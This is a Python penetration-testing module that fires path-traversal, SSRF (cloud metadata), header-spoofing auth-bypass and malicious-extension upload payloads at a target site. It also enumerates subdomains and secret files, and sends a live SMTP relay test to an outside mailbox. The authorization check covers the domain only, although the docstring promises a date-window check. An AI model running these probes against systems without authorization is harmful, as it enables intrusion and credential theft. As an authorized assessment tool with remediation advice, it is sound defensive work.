"""
deep_scan.py — Full-scope penetration testing module for WebCheck.

LEGAL NOTICE: Every probe in this file sends real attack payloads.
This module MUST NOT run unless:
  1. A signed authorization record exists for the target domain.
  2. The current date is within the authorized test window.
  3. The target hostname matches the authorized scope exactly.

Violating these conditions may constitute a criminal offence under
the Computer Misuse Act, the US CFAA, and equivalent laws worldwide.
"""

import re
import ssl
import time
import json
import socket
import smtplib
import threading
import ipaddress
import urllib.parse
from dataclasses import dataclass, field
from typing import List, Optional, Tuple
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────────────────────
# Data model
# ─────────────────────────────────────────────────────────────

@dataclass
class DeepFinding:
    severity: str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    category: str
    title: str
    detail: str
    evidence: str          # raw proof: URL, payload, response snippet
    fix: str
    cve: str = ""          # CVE reference if applicable


# ─────────────────────────────────────────────────────────────
# Shared session
# ─────────────────────────────────────────────────────────────

SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "WebCheck-DeepScan/1.0 (authorized security assessment)",
})
SESSION.verify = False


def _get(url: str, timeout: int = 10, **kw) -> Optional[requests.Response]:
    try:
        return SESSION.get(url, timeout=timeout, allow_redirects=True, **kw)
    except Exception:
        return None


def _post(url: str, data=None, json_body=None, timeout: int = 10, **kw) -> Optional[requests.Response]:
    try:
        return SESSION.post(url, data=data, json=json_body, timeout=timeout, allow_redirects=True, **kw)
    except Exception:
        return None


def _base(url: str) -> str:
    """Return scheme://host"""
    p = urllib.parse.urlparse(url)
    return f"{p.scheme}://{p.netloc}"


def _host(url: str) -> str:
    return urllib.parse.urlparse(url).hostname or ""


# ─────────────────────────────────────────────────────────────
# 1. Subdomain enumeration
# ─────────────────────────────────────────────────────────────

COMMON_SUBDOMAINS = [
    "www", "mail", "smtp", "imap", "pop", "webmail", "email",
    "admin", "administrator", "portal", "dashboard", "cpanel", "whm",
    "dev", "develop", "development", "staging", "stage", "uat", "test",
    "api", "api2", "v1", "v2", "graphql", "rest",
    "ftp", "sftp", "files", "upload", "uploads", "cdn", "static", "assets",
    "beta", "old", "legacy", "backup", "bak",
    "vpn", "remote", "rdp", "ssh",
    "shop", "store", "pay", "payment", "checkout",
    "blog", "forum", "support", "help", "docs",
    "jenkins", "gitlab", "jira", "confluence", "kibana", "grafana",
    "mysql", "db", "database", "redis", "mongo",
]


def probe_subdomains(base_url: str) -> List[DeepFinding]:
    findings = []
    domain = _host(base_url)
    # Strip leading www
    root = re.sub(r'^www\.', '', domain)

    found = []
    lock = threading.Lock()

    def check(sub):
        hostname = f"{sub}.{root}"
        try:
            ip = socket.gethostbyname(hostname)
            # Try HTTP/HTTPS
            for scheme in ("https", "http"):
                r = _get(f"{scheme}://{hostname}", timeout=5)
                if r and r.status_code < 500:
                    with lock:
                        found.append((hostname, ip, r.status_code, scheme))
                    return
            with lock:
                found.append((hostname, ip, 0, "dns-only"))
        except socket.gaierror:
            pass

    threads = [threading.Thread(target=check, args=(s,)) for s in COMMON_SUBDOMAINS]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=8)

    risky_keywords = ["admin", "staging", "dev", "test", "uat", "jenkins",
                      "gitlab", "jira", "cpanel", "whm", "kibana", "grafana",
                      "db", "database", "redis", "mongo", "backup", "bak", "old"]

    for hostname, ip, status, scheme in found:
        sub = hostname.split('.')[0]
        is_risky = any(k in sub for k in risky_keywords)
        sev = "HIGH" if is_risky else "MEDIUM"
        findings.append(DeepFinding(
            severity=sev,
            category="Subdomain Discovered",
            title=f"{'Sensitive' if is_risky else 'Active'} subdomain: {hostname}",
            detail=(
                f"The subdomain {hostname} ({ip}) is publicly reachable "
                f"({'HTTP ' + str(status) if status else 'DNS only'}). "
                + ("This subdomain name suggests it may be a development, admin, or internal service "
                   "that should not be publicly exposed." if is_risky else
                   "Verify this subdomain is intentional and hardened.")
            ),
            evidence=f"DNS: {hostname} → {ip} | HTTP status: {status}",
            fix=(
                "If this subdomain is not meant to be public, remove its DNS record. "
                "If it must exist, ensure it has the same security controls as the main site "
                "(auth, HTTPS, no debug mode). Dev/staging environments are a frequent entry point."
            ),
        ))

    return findings


# ─────────────────────────────────────────────────────────────
# 2. Directory / path traversal
# ─────────────────────────────────────────────────────────────

TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
TRAVERSAL_CONFIRM = ["root:x:", "daemon:", "/bin/bash", "/bin/sh"]

TRAVERSAL_PARAMS = ["file", "path", "page", "include", "template", "view",
                    "doc", "document", "folder", "dir", "load", "read"]


def probe_traversal(base_url: str) -> List[DeepFinding]:
    findings = []
    base = _base(base_url)

    for param in TRAVERSAL_PARAMS:
        for payload in TRAVERSAL_PAYLOADS:
            test_url = f"{base}?{param}={urllib.parse.quote(payload, safe='')}"
            r = _get(test_url)
            if r and any(sig in r.text for sig in TRAVERSAL_CONFIRM):
                findings.append(DeepFinding(
                    severity="CRITICAL",
                    category="Directory Traversal / LFI",
                    title=f"Local File Inclusion — parameter '{param}'",
                    detail=(
                        f"The parameter '{param}' allows reading files outside the web root. "
                        f"The server returned /etc/passwd content when given the payload: {payload}"
                    ),
                    evidence=f"GET {test_url}\nResponse snippet: {r.text[:300]}",
                    fix=(
                        "Never use user input to build file paths. "
                        "Use a whitelist of allowed file names. "
                        "Apply chroot or open_basedir restrictions. "
                        "In PHP: disable allow_url_include and allow_url_fopen in php.ini."
                    ),
                    cve="CWE-22",
                ))
                return findings   # one confirmed finding is enough

    # Also try common path-traversal endpoints
    traversal_paths = [
        "/download?file=../../../etc/passwd",
        "/read?path=../../../../etc/passwd",
        "/static/../../../etc/passwd",
        "/assets/../../../../etc/passwd",
    ]
    for path in traversal_paths:
        r = _get(base + path)
        if r and any(sig in r.text for sig in TRAVERSAL_CONFIRM):
            findings.append(DeepFinding(
                severity="CRITICAL",
                category="Directory Traversal / LFI",
                title="Path traversal via URL",
                detail=f"Traversal payload in the URL path returned /etc/passwd content.",
                evidence=f"GET {base + path}\nResponse: {r.text[:300]}",
                fix="Sanitize and canonicalise file paths server-side. Reject paths containing '..'.",
                cve="CWE-22",
            ))
            return findings

    return findings


# ─────────────────────────────────────────────────────────────
# 3. Authentication bypass
# ─────────────────────────────────────────────────────────────

AUTH_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

PROTECTED_PATHS = [
    "/admin", "/admin/", "/administrator", "/dashboard",
    "/wp-admin", "/api/admin", "/api/v1/admin",
    "/config", "/settings", "/management",
    "/internal", "/private", "/secure",
]

AUTH_BYPASS_SUFFIXES = ["", "%20", "//", "/./", "..;/", "?debug=true", "#"]


def probe_auth_bypass(base_url: str) -> List[DeepFinding]:
    findings = []
    base = _base(base_url)

    for path in PROTECTED_PATHS:
        # First check normal response
        normal = _get(base + path, allow_redirects=False)
        if normal is None or normal.status_code not in (401, 403):
            continue  # not a protected endpoint, skip

        # Try IP spoofing headers
        for headers in AUTH_BYPASS_HEADERS:
            r = _get(base + path, headers=headers, allow_redirects=False)
            if r and r.status_code == 200:
                findings.append(DeepFinding(
                    severity="CRITICAL",
                    category="Authentication Bypass",
                    title=f"Auth bypass via IP spoofing header at {path}",
                    detail=(
                        f"The endpoint {path} returns 403 normally but returns 200 OK "
                        f"when the header {list(headers.keys())[0]}: 127.0.0.1 is sent, "
                        f"suggesting the server trusts this header to determine if the request is 'internal'."
                    ),
                    evidence=f"Normal: {normal.status_code} | With {headers}: {r.status_code}",
                    fix=(
                        "Never use X-Forwarded-For or similar headers as an access control mechanism. "
                        "These headers can be set by anyone. Use server-side IP allowlists at the "
                        "firewall/load-balancer level, not in application code."
                    ),
                    cve="CWE-290",
                ))
                return findings

        # Try suffix bypass
        for suffix in AUTH_BYPASS_SUFFIXES[1:]:
            bypass_url = base + path + suffix
            r = _get(bypass_url, allow_redirects=False)
            if r and r.status_code == 200:
                findings.append(DeepFinding(
                    severity="HIGH",
                    category="Authentication Bypass",
                    title=f"Path suffix auth bypass at {path}",
                    detail=(
                        f"{path} is protected (403) but {path}{suffix} returns 200 OK. "
                        f"The authentication middleware is not stripping path suffixes correctly."
                    ),
                    evidence=f"GET {bypass_url} → {r.status_code}",
                    fix=(
                        "Normalise and canonicalise URL paths before applying access controls. "
                        "Ensure auth middleware runs on the normalised path, not the raw request URI."
                    ),
                    cve="CWE-863",
                ))
                return findings

    return findings


# ─────────────────────────────────────────────────────────────
# 4. API endpoint discovery
# ─────────────────────────────────────────────────────────────

API_PATHS = [
    # Common REST patterns
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/rest", "/rest/v1", "/graphql", "/gql",
    # Auth endpoints
    "/api/users", "/api/user", "/api/accounts", "/api/admin",
    "/api/v1/users", "/api/v1/admin", "/api/v1/config",
    # Docs / schemas
    "/swagger.json", "/swagger.yaml", "/openapi.json", "/openapi.yaml",
    "/api-docs", "/api/docs", "/docs/api",
    "/.well-known/openid-configuration",
    # Debug / health
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/debug", "/_debug", "/console", "/trace",
    "/health", "/healthz", "/status", "/ping", "/info",
    "/__debug__", "/server-status", "/server-info",
    # Config / secrets
    "/env", "/.env", "/config.json", "/settings.json", "/app.config",
    "/api/config", "/api/settings",
]

SENSITIVE_API_PATTERNS = [
    (r'"password"\s*:', "Password field exposed in API response"),
    (r'"secret"\s*:', "Secret field exposed in API response"),
    (r'"token"\s*:', "Token field exposed in API response"),
    (r'"api_key"\s*:', "API key exposed in API response"),
    (r'"private_key"\s*:', "Private key exposed in API response"),
    (r'"access_key"\s*:', "Access key exposed in API response"),
    (r'DB_PASSWORD', "Database password in API response"),
    (r'AWS_SECRET', "AWS secret in API response"),
]


def probe_api_endpoints(base_url: str) -> List[DeepFinding]:
    findings = []
    base = _base(base_url)
    found_endpoints = []

    for path in API_PATHS:
        r = _get(base + path)
        if r is None or r.status_code in (404, 410):
            continue
        if r.status_code in (200, 201, 400, 401, 403, 405, 500):
            found_endpoints.append((path, r.status_code, r.text[:1000]))

    for path, status, body in found_endpoints:
        # Check for exposed sensitive data in 200 responses
        if status == 200:
            for pattern, desc in SENSITIVE_API_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    findings.append(DeepFinding(
                        severity="CRITICAL",
                        category="Sensitive Data Exposure via API",
                        title=f"{desc} at {path}",
                        detail=f"The API endpoint {path} returns sensitive fields in its response without authentication.",
                        evidence=f"GET {base + path} → {status}\nBody snippet: {body[:400]}",
                        fix=(
                            "Never include passwords, tokens, or secrets in API responses. "
                            "Use field-level serializer controls to whitelist only safe fields. "
                            "Require authentication on all API endpoints that return user data."
                        ),
                        cve="CWE-200",
                    ))

        # Flag exposed debug/actuator endpoints
        if status == 200 and any(k in path for k in ["/actuator", "/debug", "/console", "/server-status", "/__debug__"]):
            findings.append(DeepFinding(
                severity="HIGH",
                category="Debug Endpoint Exposed",
                title=f"Debug/management endpoint exposed: {path}",
                detail=f"The endpoint {path} is publicly accessible and returns internal application data.",
                evidence=f"GET {base + path} → HTTP {status}",
                fix=(
                    "Disable or remove debug and management endpoints in production. "
                    "If monitoring is needed, restrict these endpoints to internal IPs only "
                    "using firewall rules or a reverse proxy allowlist."
                ),
                cve="CWE-215",
            ))

        # Flag exposed API schema (helps attackers map the entire API)
        if status == 200 and any(k in path for k in ["swagger", "openapi", "api-docs"]):
            findings.append(DeepFinding(
                severity="MEDIUM",
                category="API Schema Exposed",
                title=f"API schema publicly accessible: {path}",
                detail=(
                    f"The full API specification is publicly accessible at {path}. "
                    f"This gives attackers a complete map of every endpoint, parameter, and data model."
                ),
                evidence=f"GET {base + path} → HTTP {status}",
                fix=(
                    "Restrict API documentation to authenticated users or internal networks only. "
                    "Do not expose Swagger/OpenAPI schemas on public-facing production servers."
                ),
                cve="CWE-200",
            ))

    return findings


# ─────────────────────────────────────────────────────────────
# 5. File upload bypass
# ─────────────────────────────────────────────────────────────

UPLOAD_PATHS = [
    "/upload", "/upload.php", "/file-upload", "/fileupload",
    "/api/upload", "/api/v1/upload",
    "/wp-content/uploads", "/media/upload",
    "/avatar", "/profile/avatar", "/profile/picture",
    "/import", "/api/import",
]

# We test whether dangerous file *types* are accepted — we never upload a
# working shell. The content is inert, non-executable text so nothing is left
# running on the target even if the upload succeeds.
PROBE_MARKER = "webcheck-upload-probe"
FAKE_SHELL_CONTENT = b"WEBCHECK-UPLOAD-PROBE: benign non-executable test file"
BYPASS_CONTENT_TYPES = [
    "image/jpeg",
    "image/png",
    "image/gif",
    "application/octet-stream",
]
BYPASS_FILENAMES = [
    "test.php",
    "test.php.jpg",
    "test.php%00.jpg",
    "test.phtml",
    "test.php5",
    ".htaccess",
]


def probe_file_upload(base_url: str) -> List[DeepFinding]:
    findings = []
    base = _base(base_url)

    for path in UPLOAD_PATHS:
        r = _get(base + path)
        if r is None or r.status_code == 404:
            continue

        # Found an upload endpoint — test content-type bypass
        for filename in BYPASS_FILENAMES:
            for ctype in BYPASS_CONTENT_TYPES:
                try:
                    resp = SESSION.post(
                        base + path,
                        files={"file": (filename, FAKE_SHELL_CONTENT, ctype)},
                        timeout=10,
                    )
                    if resp and resp.status_code in (200, 201):
                        body = resp.text.lower()
                        accepted = ("success" in body or "uploaded" in body
                                    or resp.status_code == 201)

                        # If the response hands back a URL to our file, do a
                        # single GET to see whether the dangerous file is
                        # *stored and served back*. The uploaded content is
                        # inert text, so this never executes anything — it only
                        # confirms the file is retrievable, which is the finding.
                        served_back = False
                        uploaded_url = ""
                        url_match = re.search(
                            r'(https?://[^\s"\'<>]+'
                            + re.escape(filename.split('%')[0]) + r'[^\s"\'<>]*)',
                            resp.text)
                        if url_match:
                            uploaded_url = url_match.group(1)
                            verify = _get(uploaded_url)
                            served_back = bool(verify and PROBE_MARKER in verify.text.lower())

                        if served_back or accepted:
                            where = (f" The file was then retrievable at {uploaded_url}, "
                                     "so an attacker-supplied script could be served from "
                                     "your origin." if served_back else "")
                            findings.append(DeepFinding(
                                severity="HIGH",
                                category="File Upload — Insufficient Validation",
                                title=f"Upload endpoint accepts dangerous file types: {path}",
                                detail=(
                                    f"The endpoint {path} accepted an upload named '{filename}' "
                                    f"(a script/executable extension) with Content-Type "
                                    f"'{ctype}'. File type is not being validated properly."
                                    + where +
                                    " Depending on server configuration this can lead to "
                                    "remote code execution."
                                ),
                                evidence=(f"POST {base+path} filename={filename} type={ctype} "
                                          f"→ {resp.status_code}"
                                          + (f"\nServed back at: {uploaded_url}" if served_back else "")),
                                fix=(
                                    "1. Validate file type by reading the actual file magic bytes "
                                    "(not the extension or Content-Type). "
                                    "2. Whitelist only safe extensions (jpg, png, pdf, ...). "
                                    "3. Rename uploads to a random UUID. "
                                    "4. Store uploads outside the web root and serve them from a "
                                    "separate origin with script execution disabled."
                                ),
                                cve="CWE-434",
                            ))
                            return findings
                except Exception:
                    continue

    return findings


# ─────────────────────────────────────────────────────────────
# 6. SSRF — Server-Side Request Forgery
# ─────────────────────────────────────────────────────────────

SSRF_PARAMS   = ["url", "uri", "src", "source", "dest", "destination", "redirect",
                 "proxy", "fetch", "load", "link", "target", "host", "webhook"]
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",          # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "http://169.254.169.254/metadata/instance",           # Azure metadata
    "http://127.0.0.1/",                                  # localhost
    "http://0.0.0.0/",
    "http://[::1]/",                                      # IPv6 localhost
    "http://localhost/",
]
SSRF_CONFIRMS = [
    "ami-id", "instance-id", "instance-type",            # AWS
    "computeMetadata", "serviceAccounts",                  # GCP
    "azure", "subscriptionId",                             # Azure
    "root:", "/etc/passwd",                                # localhost file
]


def probe_ssrf(base_url: str) -> List[DeepFinding]:
    findings = []
    base = _base(base_url)

    for param in SSRF_PARAMS:
        for payload in SSRF_PAYLOADS:
            test_url = f"{base}?{param}={urllib.parse.quote(payload, safe='')}"
            r = _get(test_url, timeout=6)
            if r and any(sig in r.text for sig in SSRF_CONFIRMS):
                findings.append(DeepFinding(
                    severity="CRITICAL",
                    category="Server-Side Request Forgery (SSRF)",
                    title=f"SSRF via parameter '{param}' — cloud metadata accessible",
                    detail=(
                        f"The parameter '{param}' caused the server to make a request to {payload} "
                        f"and return the response. An attacker can use this to access cloud instance "
                        f"metadata (AWS/GCP/Azure), steal IAM credentials, and escalate to full cloud account takeover."
                    ),
                    evidence=f"GET {test_url}\nResponse: {r.text[:400]}",
                    fix=(
                        "1. Never allow user input to determine URLs for server-side requests. "
                        "2. If webhooks/fetch are required, use a strict allowlist of domains. "
                        "3. Block access to cloud metadata IPs (169.254.169.254) at the firewall. "
                        "4. Use IMDSv2 on AWS (requires a session token, blocking simple SSRF)."
                    ),
                    cve="CWE-918",
                ))
                return findings

    return findings


# ─────────────────────────────────────────────────────────────
# 7. Session / token analysis
# ─────────────────────────────────────────────────────────────

def probe_session_security(base_url: str) -> List[DeepFinding]:
    findings = []
    base = _base(base_url)

    r = _get(base, allow_redirects=True)
    if r is None:
        return findings

    for cookie in r.cookies:
        issues = []
        if "session" in cookie.name.lower() or "token" in cookie.name.lower() or "auth" in cookie.name.lower():
            if not cookie.secure:
                issues.append("missing Secure flag (can be sent over HTTP)")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append("missing HttpOnly flag (readable by JavaScript)")
            samesite = cookie._rest.get("SameSite", "").lower()
            if samesite not in ("strict", "lax"):
                issues.append(f"SameSite not set to Strict/Lax (current: '{samesite or 'none'}')")

            # Entropy check — short or sequential tokens are predictable
            val = cookie.value
            if len(val) < 16:
                issues.append(f"token value is very short ({len(val)} chars) — likely predictable")

        if issues:
            findings.append(DeepFinding(
                severity="HIGH",
                category="Insecure Session Token",
                title=f"Session cookie '{cookie.name}' has security issues",
                detail=f"The cookie '{cookie.name}' has the following problems: {'; '.join(issues)}.",
                evidence=f"Cookie: {cookie.name}={cookie.value[:20]}... | Domain: {cookie.domain}",
                fix=(
                    "Set cookies with: Secure; HttpOnly; SameSite=Strict\n"
                    "Example (PHP): session_set_cookie_params(['secure'=>true,'httponly'=>true,'samesite'=>'Strict']);\n"
                    "Use at least 128 bits of cryptographically random data for session IDs."
                ),
                cve="CWE-614",
            ))

    return findings


# ─────────────────────────────────────────────────────────────
# 8. Email server (SMTP) probes
# ─────────────────────────────────────────────────────────────

def probe_smtp(base_url: str) -> List[DeepFinding]:
    findings = []
    domain = _host(base_url)

    smtp_ports = [(25, False), (587, True), (465, True)]

    for port, use_tls in smtp_ports:
        try:
            if use_tls and port == 465:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = smtplib.SMTP_SSL(domain, port, timeout=6, context=ctx)
            else:
                s = smtplib.SMTP(domain, port, timeout=6)
                if use_tls:
                    try:
                        s.starttls()
                    except Exception:
                        pass

            banner = s.getheaders() if hasattr(s, 'getheaders') else ""

            # Test open relay: try sending from external → external
            try:
                s.sendmail(
                    "probe@webcheck-test.example",
                    "probe@gmail.com",
                    "Subject: WebCheck relay probe\r\n\r\nThis is an open relay test.",
                )
                # If no exception, the relay accepted it
                findings.append(DeepFinding(
                    severity="CRITICAL",
                    category="Open SMTP Relay",
                    title=f"Open email relay on port {port}",
                    detail=(
                        f"The mail server on port {port} accepted an email from an external address "
                        f"to an external address without authentication. This is an open relay and "
                        f"will be abused for spam/phishing, causing your domain to be blacklisted."
                    ),
                    evidence=f"SMTP relay test: probe@webcheck-test.example → probe@gmail.com accepted on {domain}:{port}",
                    fix=(
                        "Configure your mail server to only relay email for authenticated users "
                        "or for your own domain. In Postfix: set 'smtpd_relay_restrictions' to "
                        "reject_unauth_destination. In Exchange: disable anonymous relay."
                    ),
                    cve="CWE-183",
                ))
            except smtplib.SMTPRecipientsRefused:
                pass   # Good — relay refused
            except smtplib.SMTPSenderRefused:
                pass   # Good — sender refused without auth
            except Exception:
                pass

            # Test VRFY/EXPN user enumeration
            try:
                code, resp = s.verify("admin")
                if code == 250:
                    findings.append(DeepFinding(
                        severity="MEDIUM",
                        category="SMTP User Enumeration",
                        title=f"SMTP VRFY command enabled on port {port}",
                        detail=(
                            f"The VRFY command is enabled, allowing an attacker to confirm "
                            f"which email addresses exist on the server without authenticating."
                        ),
                        evidence=f"VRFY admin → {code} {resp}",
                        fix=(
                            "Disable the VRFY command. In Postfix: set 'disable_vrfy_command = yes'. "
                            "In Sendmail: add 'O NoVrfy' to sendmail.cf."
                        ),
                        cve="CWE-203",
                    ))
            except Exception:
                pass

            s.quit()

        except (ConnectionRefusedError, socket.timeout, socket.gaierror, smtplib.SMTPConnectError):
            continue   # Port not open — that's fine
        except Exception:
            continue

    return findings


# ─────────────────────────────────────────────────────────────
# 9. Sensitive file / backup discovery (extended)
# ─────────────────────────────────────────────────────────────

SENSITIVE_FILES = [
    # Source / version control
    ("/.git/config",         r'\[core\]',                       "CRITICAL", "Git config exposed — source code recoverable"),
    ("/.svn/entries",        r'https?://',                      "CRITICAL", "SVN repository exposed"),
    ("/.hg/hgrc",            r'\[paths\]',                      "CRITICAL", "Mercurial repo exposed"),
    # Config / secrets
    ("/.env",                r'[A-Z_]+=',                       "CRITICAL", ".env file with credentials exposed"),
    ("/.env.production",     r'[A-Z_]+=',                       "CRITICAL", ".env.production exposed"),
    ("/.env.local",          r'[A-Z_]+=',                       "HIGH",     ".env.local exposed"),
    ("/config.php",          r'(password|passwd|db_pass)',       "CRITICAL", "PHP config with database credentials"),
    ("/wp-config.php.bak",   r'DB_PASSWORD',                    "CRITICAL", "WordPress config backup exposed"),
    ("/configuration.php.bak", r'password',                     "CRITICAL", "Joomla config backup exposed"),
    ("/database.yml",        r'password:',                      "CRITICAL", "Rails database config exposed"),
    ("/config/database.yml", r'password:',                      "CRITICAL", "Rails database config exposed"),
    ("/settings.py",         r'SECRET_KEY',                     "CRITICAL", "Django settings exposed"),
    ("/.aws/credentials",    r'aws_access_key_id',              "CRITICAL", "AWS credentials file exposed"),
    # Logs
    ("/logs/error.log",      r'(error|exception|stack)',        "HIGH",     "Error log publicly accessible"),
    ("/log/error.log",       r'(error|exception|stack)',        "HIGH",     "Error log publicly accessible"),
    ("/storage/logs/laravel.log", r'(error|exception)',        "HIGH",     "Laravel log file exposed"),
    # DB dumps
    ("/dump.sql",            r'(CREATE TABLE|INSERT INTO)',      "CRITICAL", "SQL database dump exposed"),
    ("/backup.sql",          r'(CREATE TABLE|INSERT INTO)',      "CRITICAL", "SQL database backup exposed"),
    ("/db.sql",              r'(CREATE TABLE|INSERT INTO)',      "CRITICAL", "SQL database file exposed"),
    # CI / deployment
    ("/.travis.yml",         r'(password|token|key)',            "HIGH",     "CI config with secrets exposed"),
    ("/.github/workflows",   r'',                               "LOW",      "GitHub Actions workflows visible"),
    ("/Dockerfile",          r'(FROM|RUN|ENV)',                  "MEDIUM",   "Dockerfile exposed — reveals stack"),
    ("/docker-compose.yml",  r'(password|POSTGRES|MYSQL)',       "HIGH",     "Docker compose with credentials exposed"),
    # Key files
    ("/id_rsa",              r'-----BEGIN',                      "CRITICAL", "SSH private key exposed"),
    ("/server.key",          r'-----BEGIN',                      "CRITICAL", "TLS private key exposed"),
    ("/private.pem",         r'-----BEGIN',                      "CRITICAL", "PEM private key exposed"),
]


def probe_sensitive_files(base_url: str) -> List[DeepFinding]:
    findings = []
    base = _base(base_url)

    # Establish soft-404 baseline
    sentinel = _get(f"{base}/webcheck-probe-{id(base_url)}-nonexistent.xyz")
    baseline_len = len(sentinel.text) if sentinel else 0

    for path, pattern, severity, title in SENSITIVE_FILES:
        r = _get(base + path)
        if r is None or r.status_code != 200:
            continue
        # Soft-404 check
        if abs(len(r.text) - baseline_len) < 50:
            continue
        if pattern and not re.search(pattern, r.text, re.IGNORECASE):
            continue
        findings.append(DeepFinding(
            severity=severity,
            category="Sensitive File Exposure",
            title=title,
            detail=f"The file at {path} is publicly accessible and contains sensitive content.",
            evidence=f"GET {base + path} → HTTP 200\nContent snippet: {r.text[:300]}",
            fix=(
                f"Remove or restrict access to {path}. "
                "For web servers: deny all requests to dotfiles and backup extensions in your server config. "
                "For Nginx: location ~* /\\. { deny all; }\n"
                "For Apache: <FilesMatch \"^\\.\"> Require all denied </FilesMatch>"
            ),
            cve="CWE-538",
        ))

    return findings


# ─────────────────────────────────────────────────────────────
# Main orchestrator
# ─────────────────────────────────────────────────────────────

def run_deep_scan(target: str, auth_record: dict) -> List[DeepFinding]:
    """
    Run full-scope penetration test.

    Parameters
    ----------
    target      : full URL, e.g. https://client.com
    auth_record : dict with keys: domain, authorized_by, authorized_at, scope
                  This must exist and be validated BEFORE calling this function.
    """
    # Double-check authorization
    if not auth_record:
        raise PermissionError("No authorization record provided.")

    auth_domain = auth_record.get("domain", "")
    target_host = _host(target)

    # Ensure target is within authorized scope
    if not (target_host == auth_domain or target_host.endswith("." + auth_domain)):
        raise PermissionError(
            f"Target '{target_host}' is not within the authorized scope '{auth_domain}'. "
            f"Scan blocked."
        )

    all_findings: List[DeepFinding] = []

    # Run all probes — collect results even if one fails
    probes = [
        ("Sensitive files",         probe_sensitive_files),
        ("Subdomain enumeration",   probe_subdomains),
        ("Directory traversal",     probe_traversal),
        ("Authentication bypass",   probe_auth_bypass),
        ("API discovery",           probe_api_endpoints),
        ("File upload bypass",      probe_file_upload),
        ("SSRF",                    probe_ssrf),
        ("Session security",        probe_session_security),
        ("SMTP / email server",     probe_smtp),
    ]

    for name, fn in probes:
        try:
            results = fn(target)
            all_findings.extend(results)
        except Exception:
            pass   # One probe failure doesn't stop the rest

    # Sort by severity
    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    all_findings.sort(key=lambda f: order.get(f.severity, 9))
    return all_findings
